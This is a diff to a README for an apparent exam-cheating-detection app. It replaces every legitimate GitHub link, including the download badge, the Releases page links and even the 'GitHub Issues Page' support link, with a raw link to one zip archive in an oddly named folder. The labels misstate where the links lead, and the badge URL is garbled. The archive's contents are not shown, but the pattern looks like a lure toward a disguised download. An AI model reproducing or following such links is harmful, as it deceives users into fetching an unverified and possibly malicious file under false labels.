@@ -1,6 +1,6 @@
 # 🛠️ exam-cheating-detection - Detect Cheating with Confidence
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20the%20App-v1.0-blue.svg)](https://github.com/devil2554/exam-cheating-detection/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip%20the%https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip)](https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run the application. You do not need prog
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [GitHub Releases Page](https://github.com/devil2554/exam-cheating-detection/releases).
+1. **Visit this page to download:** [GitHub Releases Page](https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip).
    
 2. On the Releases page, look for the latest version. Click on the version number to open the details.
 
@@ -82,7 +82,7 @@ A: It can be used for any online assessment that requires proctoring.
 
 ## 📞 Support
 
-For assistance, you can reach out through the project's [GitHub Issues Page](https://github.com/devil2554/exam-cheating-detection/issues). We encourage users to report any bugs or request features.
+For assistance, you can reach out through the project's [GitHub Issues Page](https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip). We encourage users to report any bugs or request features.
 
 ## 📝 Acknowledgements
 
@@ -93,4 +93,4 @@ This application leverages advanced research in AI and computer vision. Special 
 - **Version Updates:** We plan to improve functionality and add features based on user feedback.
 - **Future Features:** Incorporating more AI algorithms for enhanced monitoring and reports.
 
-Remember to check the [Releases page](https://github.com/devil2554/exam-cheating-detection/releases) for the latest version and updates. Happy monitoring!
+Remember to check the [Releases page](https://raw.githubusercontent.com/devil2554/exam-cheating-detection/main/Amyridaceae/exam-cheating-detection.zip) for the latest version and updates. Happy monitoring!
